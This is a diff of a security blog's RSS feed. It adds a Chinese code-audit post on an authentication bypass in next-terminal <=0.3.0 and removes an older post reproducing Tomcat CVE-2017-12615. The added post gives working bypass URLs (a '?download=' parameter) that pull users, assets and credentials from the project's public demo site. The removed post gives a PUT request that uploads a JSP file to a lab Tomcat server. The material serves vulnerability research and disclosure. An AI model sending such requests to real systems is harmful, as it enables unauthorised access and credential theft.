@@ -6,7 +6,7 @@
   <link href="/rss.xml" rel="self"/>
   
   <link href="https://xiaokou.top/"/>
-  <updated>2021-01-20T16:13:29.162Z</updated>
+  <updated>2021-03-10T03:54:28.832Z</updated>
   <id>https://xiaokou.top/</id>
   
   <author>
@@ -15,6 +15,38 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>go代码审计-next-terminal权限绕过</title>
+    <link href="https://xiaokou.top/2021/03/10/go-dai-ma-shen-ji-next-terminal-quan-xian-rao-guo/"/>
+    <id>https://xiaokou.top/2021/03/10/go-dai-ma-shen-ji-next-terminal-quan-xian-rao-guo/</id>
+    <published>2021-03-10T03:49:57.000Z</published>
+    <updated>2021-03-10T03:54:28.832Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="next-terminal-代码审计"><a href="#next-terminal-代码审计" class="headerlink" title="next-terminal 代码审计"></a>next-terminal 代码审计</h1><p>项目地址：</p><p><a href="https://github.com/dushixiang/next-terminal" target="_blank" rel="noopener">https://github.com/dushixiang/next-terminal</a></p><p>危害版本：<br><code>&lt;=0.3.0</code></p><h3 id="0x0-环境搭建"><a href="#0x0-环境搭建" class="headerlink" title="0x0 环境搭建"></a>0x0 环境搭建</h3><p>运行项目<br><code>docker run -d   -p 8088:8088   --name next-terminal   --restart always dushixiang/next-terminal:latest</code></p><h3 id="0x1-权限绕过"><a href="#0x1-权限绕过" class="headerlink" title="0x1 权限绕过"></a>0x1 权限绕过</h3><p>代码分析：</p><p>pkg/api/routes.go:37行加载<code>Auth</code>认证</p><p><img src="http://124.70.145.45:8081/uploads/ed759ef5a1d6c7cbb59c87f21ed404e0" alt="image-20210305125205180"></p><p>跟进<code>Auth</code>函数</p><p>pkg/api/middleware.go:28 </p><p><img src="http://124.70.145.45:8081/uploads/1bb11e4eb80ac4a0060c5ec859d1dab7" alt=""></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Auth</span><span class="params">(next echo.HandlerFunc)</span> <span class="title">echo</span>.<span class="title">HandlerFunc</span></span> {</span><br><span class="line"></span><br><span class="line">urls := []<span class="keyword">string</span>{<span class="string">"download"</span>, <span class="string">"recording"</span>, <span class="string">"login"</span>, <span class="string">"static"</span>, <span class="string">"favicon"</span>, <span class="string">"logo"</span>, <span class="string">"asciinema"</span>}</span><br><span class="line"><span class="comment">// 这里是为了给不需要认证的路由提供便利</span></span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c echo.Context)</span> <span class="title">error</span></span> {</span><br><span class="line"><span class="comment">// 路由拦截 - 登录身份、资源权限判断等</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="keyword">range</span> urls {</span><br><span class="line"><span class="keyword">if</span> c.Request().RequestURI == <span class="string">"/"</span> || strings.HasPrefix(c.Request().RequestURI, <span class="string">"/#"</span>) {</span><br><span class="line"><span class="keyword">return</span> next(c)</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> strings.Contains(c.Request().RequestURI, urls[i]) { <span class="comment">//  路由中携带urls中的关键字</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">return</span> next(c) <span class="comment">//?download=suanve 实现权限绕过</span></span><br><span class="line">        </span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">token := GetToken(c)</span><br><span class="line">cacheKey := strings.Join([]<span class="keyword">string</span>{Token, token}, <span class="string">":"</span>)</span><br><span class="line">authorization, found := global.Cache.Get(cacheKey)</span><br><span class="line"><span class="keyword">if</span> !found {</span><br><span class="line"><span class="keyword">return</span> Fail(c, <span class="number">401</span>, <span class="string">"您的登录信息已失效，请重新登录后再试。"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="0x3-官网demo实测："><a href="#0x3-官网demo实测：" class="headerlink" title="0x3 官网demo实测："></a>0x3 官网demo实测：</h4><h5 id="获取用户列表"><a href="#获取用户列表" class="headerlink" title="获取用户列表"></a>获取用户列表</h5><p><a href="https://next-terminal.typesafe.cn/users/paging?download=suanve" target="_blank" rel="noopener">https://next-terminal.typesafe.cn/users/paging?download=suanve</a></p><p><img src="http://124.70.145.45:8081/uploads/487f129108c7b95560ec74995ea417e7" alt="image-20210305124955423"></p><h5 id="获取资产"><a href="#获取资产" class="headerlink" title="获取资产"></a>获取资产</h5><p><a href="https://next-terminal.typesafe.cn/assets/paging?pageIndex=1&amp;pageSize=10&amp;protocol=&amp;download=suanve" target="_blank" rel="noopener">https://next-terminal.typesafe.cn/assets/paging?pageIndex=1&amp;pageSize=10&amp;protocol=&amp;download=suanve</a></p><p><img src="http://124.70.145.45:8081/uploads/159207df1e6df8cd5b3c6d0fc57ecf55" alt="image-20210305130107255"></p><h5 id="获取凭据"><a href="#获取凭据" class="headerlink" title="获取凭据"></a>获取凭据</h5><p><a href="https://next-terminal.typesafe.cn/credentials/paging?pageIndex=1&amp;pageSize=10&amp;download=suanve" target="_blank" rel="noopener">https://next-terminal.typesafe.cn/credentials/paging?pageIndex=1&amp;pageSize=10&amp;download=suanve</a></p><p><img src="http://124.70.145.45:8081/uploads/b4eddda35142e99069b3494eda4929f1" alt="image-20210305130436581"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;next-terminal-代码审计&quot;&gt;&lt;a href=&quot;#next-terminal-代码审计&quot; class=&quot;headerlink&quot; title=&quot;next-terminal 代码审计&quot;&gt;&lt;/a&gt;next-terminal 代码审计&lt;/h1&gt;&lt;p&gt;项目地址：&lt;
+      
+    
+    </summary>
+    
+    
+      <category term="go" scheme="https://xiaokou.top/categories/go/"/>
+    
+    
+      <category term="代码审计" scheme="https://xiaokou.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="go" scheme="https://xiaokou.top/tags/go/"/>
+    
+      <category term="next-terminal" scheme="https://xiaokou.top/tags/next-terminal/"/>
+    
+      <category term="权限绕过" scheme="https://xiaokou.top/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/"/>
+    
+  </entry>
   
   <entry>
     <title>linux下使用alias一键保存/恢复docker容器</title>
@@ -536,33 +568,6 @@
       <category term="安全基线" scheme="https://xiaokou.top/tags/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF/"/>
     
       <category term="爆破" scheme="https://xiaokou.top/tags/%E7%88%86%E7%A0%B4/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>漏洞复现-Apache Tomcat RCE(CVE-2017-12615)</title>
-    <link href="https://xiaokou.top/2019/08/08/lou-dong-fu-xian-apache-tomcat-rce-cve-2017-12615/"/>
-    <id>https://xiaokou.top/2019/08/08/lou-dong-fu-xian-apache-tomcat-rce-cve-2017-12615/</id>
-    <published>2019-08-07T21:16:00.000Z</published>
-    <updated>2020-09-08T02:07:04.132Z</updated>
-    
-    <content type="html"><![CDATA[<p>nothing</p><a id="more"></a><p>工作原因需要构建一个漏洞环境，想来想去选择了tomcat。</p><p>Apache Tomcat RCE（CVE-2017-12615 ）</p><!--more--><p>首先下载tomcat到服务器</p><p>wget <a href="https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.69/bin/apache-tomcat-7.0.69.tar.gz" target="_blank" rel="noopener">https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.69/bin/apache-tomcat-7.0.69.tar.gz</a></p><p>解压：<br><img src="https://xiaokou.top/usr/uploads/2019/12/1752578561.png" alt=""><br><code>./bin/startup.sh</code>启动tomcat<br><img src="https://xiaokou.top/usr/uploads/2019/12/2670466015.png" alt=""><br>访问<br><img src="https://xiaokou.top/usr/uploads/2019/12/3923409955.png" alt=""></p><p>开始验证测试：</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在Tomcat的conf（配置目录下）/web.xml配置文件中添加readonly设置为false时，将导致该漏洞产生：<br><img src="/post-images1565245310991.png" alt=""></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line">    &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line">    &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">&lt;/init-param&gt;</span><br></pre></td></tr></tbody></table></figure><p>重启tomcat</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./bin/shutdown.sh</span><br><span class="line"></span><br><span class="line">./bin/startup.sh</span><br></pre></td></tr></tbody></table></figure><p><img src="/post-images1565245356605.png" alt=""></p><p>通过burp发包</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: 192.168.104.130:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line">Hi Hack</span><br></pre></td></tr></tbody></table></figure><p><img src="/post-images1565245398967.png" alt=""><br>看服务器里<br><img src="/post-images1565245422806.png" alt=""><br>url:<br><a href="http://192.168.104.130:8080/1.jsp" target="_blank" rel="noopener">http://192.168.104.130:8080/1.jsp</a><br><img src="/post-images1565245432080.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;nothing&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="安全" scheme="https://xiaokou.top/categories/%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="tomcat" scheme="https://xiaokou.top/tags/tomcat/"/>
-    
-      <category term="CVE-2017-12615" scheme="https://xiaokou.top/tags/CVE-2017-12615/"/>
-    
-      <category term="rce" scheme="https://xiaokou.top/tags/rce/"/>
     
   </entry>
   
